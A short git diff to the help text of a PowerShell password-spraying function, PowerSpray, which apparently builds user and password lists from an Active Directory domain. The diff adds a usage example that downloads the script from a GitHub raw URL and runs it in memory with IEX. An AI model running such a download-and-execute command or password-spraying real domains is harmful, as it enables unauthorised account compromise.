@@ -15,6 +15,8 @@ function PowerSpray {
         By default it will automatically generate the UserList from the domain.
         By default it will automatically generate the PasswordList using the current date.
         Be careful not to lockout any accounts.
+	
+	PS C:\> IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/jnqpblc/Misc-PowerShell/master/PowerSpray.ps1"); PowerSpray
     
     .LINK
 
